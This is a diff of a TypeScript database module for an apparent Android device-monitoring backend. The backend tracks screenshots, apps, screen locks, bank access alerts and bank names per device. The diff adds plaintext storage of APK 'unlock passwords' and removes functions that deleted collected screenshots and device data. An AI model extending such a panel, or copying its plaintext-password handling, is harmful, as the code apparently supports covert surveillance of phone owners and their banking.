@@ -8,6 +8,7 @@ import {
   lgpdConsents,
   auditLogs,
   dataRetentionPolicies,
+  apkBuilds, // ✅ ADICIONADO: Importar tabela de APK builds
 } from "../drizzle/schema";
 
 export type UserDeviceSummary = {
@@ -18,63 +19,46 @@ export type UserDeviceSummary = {
   lastSeen: string;
   location: string;
   bankName?: string;
-  ipAddress?: string;
-  countryCode?: string;
-  packageName?: string;
 };
 
-type DeviceAppMetadata = {
-  deviceName?: string;
-  model?: string;
-  deviceUid?: string;
-  packageName?: string;
-  ipAddress?: string;
-  countryCode?: string;
-  location?: string;
-};
+/**
+ * ✅ ADICIONADO: APK Password Management
+ */
+export async function saveAPKPassword(
+  apkId: string,
+  password: string
+) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
 
-function parseDeviceAppMetadata(raw: string | null | undefined): DeviceAppMetadata {
-  if (!raw) return {};
-
-  try {
-    const parsed = JSON.parse(raw) as DeviceAppMetadata;
-    return {
-      deviceName: parsed.deviceName,
-      model: parsed.model,
-      deviceUid: parsed.deviceUid,
-      packageName: parsed.packageName,
-      ipAddress: parsed.ipAddress,
-      countryCode: parsed.countryCode,
-      location: parsed.location,
-    };
-  } catch {
-    return {};
-  }
+  return await db.update(apkBuilds)
+    .set({ unlockPassword: password })
+    .where(eq(apkBuilds.id, apkId));
 }
 
-function serializeDeviceAppMetadata(metadata: DeviceAppMetadata): string | null {
-  const compact: DeviceAppMetadata = {
-    deviceName: metadata.deviceName,
-    model: metadata.model,
-    deviceUid: metadata.deviceUid,
-    packageName: metadata.packageName,
-    ipAddress: metadata.ipAddress,
-    countryCode: metadata.countryCode,
-    location: metadata.location,
-  };
+export async function getAPKPassword(apkId: string) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
 
-  Object.keys(compact).forEach((key) => {
-    const typedKey = key as keyof DeviceAppMetadata;
-    if (!compact[typedKey]) {
-      delete compact[typedKey];
-    }
-  });
+  const result = await db.select()
+    .from(apkBuilds)
+    .where(eq(apkBuilds.id, apkId))
+    .limit(1);
 
-  if (Object.keys(compact).length === 0) {
-    return null;
-  }
+  return result.length > 0 ? result[0].unlockPassword : null;
+}
 
-  return JSON.stringify(compact).slice(0, 255);
+export async function getAPKPasswordByPackageName(packageName: string) {
+  const db = await getDb();
+  if (!db) throw new Error("Database not available");
+
+  const result = await db.select()
+    .from(apkBuilds)
+    .where(eq(apkBuilds.packageName, packageName))
+    .orderBy(desc(apkBuilds.createdAt))
+    .limit(1);
+
+  return result.length > 0 ? result[0].unlockPassword : null;
 }
 
 /**
@@ -123,15 +107,6 @@ export async function getScreenshots(
     .limit(limit);
 }
 
-export async function deleteScreenshot(screenshotId: number, userId: number) {
-  const db = await getDb();
-  if (!db) throw new Error("Database not available");
-
-  return await db
-    .delete(screenshots)
-    .where(and(eq(screenshots.id, screenshotId), eq(screenshots.userId, userId)));
-}
-
 /**
  * Apps Data Management
  */
@@ -142,8 +117,7 @@ export async function createOrUpdateApp(
   appPackage: string,
   appType: "system" | "user" | "corporate",
   isInstalled = true,
-  timeUsed = 0,
-  metadata?: DeviceAppMetadata
+  timeUsed = 0
 ) {
   const db = await getDb();
   if (!db) throw new Error("Database not available");
@@ -160,26 +134,17 @@ export async function createOrUpdateApp(
     .limit(1);
 
   if (existing.length > 0) {
-    const previousMetadata = parseDeviceAppMetadata(existing[0].data);
-    const mergedMetadata = serializeDeviceAppMetadata({
-      ...previousMetadata,
-      ...metadata,
-    });
-
     return await db
       .update(appsData)
       .set({
         appName,
         isInstalled: isInstalled ? 1 : 0,
         timeUsed: timeUsed || existing[0].timeUsed || 0,
-        data: mergedMetadata,
         lastUsed: new Date(),
         updatedAt: new Date(),
       })
       .where(eq(appsData.id, existing[0].id));
   }
-
-  const serializedMetadata = serializeDeviceAppMetadata(metadata ?? {});
 
   return await db.insert(appsData).values({
     deviceId,
@@ -189,7 +154,6 @@ export async function createOrUpdateApp(
     appType,
     isInstalled: isInstalled ? 1 : 0,
     timeUsed,
-    data: serializedMetadata,
     lastUsed: new Date(),
     createdAt: new Date(),
     updatedAt: new Date(),
@@ -499,40 +463,6 @@ export async function cleanupExpiredData(userId: number) {
   }
 }
 
-export async function deleteDeviceData(userId: number, deviceId: number) {
-  const db = await getDb();
-  if (!db) throw new Error("Database not available");
-
-  await db
-    .delete(screenshots)
-    .where(and(eq(screenshots.userId, userId), eq(screenshots.deviceId, deviceId)));
-
-  await db
-    .delete(appsData)
-    .where(and(eq(appsData.userId, userId), eq(appsData.deviceId, deviceId)));
-
-  await db
-    .delete(screenLocks)
-    .where(and(eq(screenLocks.userId, userId), eq(screenLocks.deviceId, deviceId)));
-
-  await db
-    .delete(bankAccessAlerts)
-    .where(
-      and(
-        eq(bankAccessAlerts.userId, userId),
-        eq(bankAccessAlerts.deviceId, deviceId)
-      )
-    );
-
-  await db
-    .delete(lgpdConsents)
-    .where(and(eq(lgpdConsents.userId, userId), eq(lgpdConsents.deviceId, deviceId)));
-
-  await db
-    .delete(auditLogs)
-    .where(and(eq(auditLogs.userId, userId), eq(auditLogs.deviceId, deviceId)));
-}
-
 export async function getUserDevicesSummary(userId: number): Promise<UserDeviceSummary[]> {
   const db = await getDb();
   if (!db) {
@@ -552,9 +482,6 @@ export async function getUserDevicesSummary(userId: number): Promise<UserDeviceS
       .select({
         deviceId: appsData.deviceId,
         timestamp: appsData.updatedAt,
-        appName: appsData.appName,
-        appPackage: appsData.appPackage,
-        data: appsData.data,
       })
       .from(appsData)
       .where(eq(appsData.userId, userId)),
@@ -578,26 +505,14 @@ export async function getUserDevicesSummary(userId: number): Promise<UserDeviceS
 
   const deviceMap = new Map<
     number,
-    {
-      lastSeenAt: Date;
-      lastScreenshotAt: Date | null;
-      location: string;
-      bankName?: string;
-      deviceName?: string;
-      model?: string;
-      ipAddress?: string;
-      countryCode?: string;
-      packageName?: string;
-    }
+    { lastSeenAt: Date; location: string; bankName?: string }
   >();
 
   const upsertSeen = (
     deviceId: number,
     timestamp: Date | null,
     location?: string | null,
-    bankName?: string | null,
-    isScreenshot = false,
-    metadata?: DeviceAppMetadata
+    bankName?: string | null
   ) => {
     if (!timestamp) return;
 
@@ -606,56 +521,22 @@ export async function getUserDevicesSummary(userId: number): Promise<UserDeviceS
     if (!current || timestamp.getTime() > current.lastSeenAt.getTime()) {
       deviceMap.set(deviceId, {
         lastSeenAt: timestamp,
-        lastScreenshotAt: isScreenshot ? timestamp : current?.lastScreenshotAt || null,
         location: location || current?.location || "Localizacao indisponivel",
         bankName: bankName || current?.bankName || undefined,
-        deviceName: metadata?.deviceName || current?.deviceName,
-        model: metadata?.model || current?.model,
-        ipAddress: metadata?.ipAddress || current?.ipAddress,
-        countryCode: metadata?.countryCode || current?.countryCode,
-        packageName: metadata?.packageName || current?.packageName,
       });
       return;
     }
 
-    if (isScreenshot && (!current.lastScreenshotAt || timestamp.getTime() > current.lastScreenshotAt.getTime())) {
-      current.lastScreenshotAt = timestamp;
-    }
     if (!current.bankName && bankName) {
       current.bankName = bankName;
     }
     if (current.location === "Localizacao indisponivel" && location) {
       current.location = location;
     }
-    if (!current.deviceName && metadata?.deviceName) {
-      current.deviceName = metadata.deviceName;
-    }
-    if (!current.model && metadata?.model) {
-      current.model = metadata.model;
-    }
-    if (!current.ipAddress && metadata?.ipAddress) {
-      current.ipAddress = metadata.ipAddress;
-    }
-    if (!current.countryCode && metadata?.countryCode) {
-      current.countryCode = metadata.countryCode;
-    }
-    if (!current.packageName && metadata?.packageName) {
-      current.packageName = metadata.packageName;
-    }
   };
 
-  screenshotRows.forEach((row) => upsertSeen(row.deviceId, row.timestamp, undefined, undefined, true));
-  appRows.forEach((row) => {
-    const metadata = parseDeviceAppMetadata(row.data);
-    const isAgentCheckin = (row.appPackage ?? "").startsWith("agent.checkin.");
-
-    if (isAgentCheckin && row.appName) {
-      metadata.deviceName = row.appName;
-      metadata.packageName = metadata.packageName || row.appPackage?.replace("agent.checkin.", "");
-    }
-
-    upsertSeen(row.deviceId, row.timestamp, metadata.location || undefined, undefined, false, metadata);
-  });
+  screenshotRows.forEach((row) => upsertSeen(row.deviceId, row.timestamp));
+  appRows.forEach((row) => upsertSeen(row.deviceId, row.timestamp));
   lockRows.forEach((row) => upsertSeen(row.deviceId, row.timestamp));
   bankRows.forEach((row) =>
     upsertSeen(
@@ -671,22 +552,15 @@ export async function getUserDevicesSummary(userId: number): Promise<UserDeviceS
   return Array.from(deviceMap.entries())
     .map(([deviceId, data]): UserDeviceSummary => {
       const minutesSinceLastSeen = (now - data.lastSeenAt.getTime()) / (1000 * 60);
-      // Considerado online se teve screenshot nos últimos 2 minutos OU qualquer atividade nos últimos 10 minutos
-      const minutesSinceLastScreenshot = data.lastScreenshotAt 
-        ? (now - data.lastScreenshotAt.getTime()) / (1000 * 60)
-        : Infinity;
 
       return {
         id: deviceId,
-        deviceName: data.deviceName || `Dispositivo ${deviceId}`,
-        deviceType: data.model || "android",
-        status: minutesSinceLastScreenshot <= 2 || minutesSinceLastSeen <= 10 ? "online" : "offline",
+        deviceName: `Dispositivo ${deviceId}`,
+        deviceType: "android",
+        status: minutesSinceLastSeen <= 10 ? "online" : "offline",
         lastSeen: data.lastSeenAt.toISOString(),
         location: data.location,
         bankName: data.bankName,
-        ipAddress: data.ipAddress,
-        countryCode: data.countryCode?.toUpperCase(),
-        packageName: data.packageName,
       };
     })
     .sort((a, b) => (a.lastSeen < b.lastSeen ? 1 : -1));
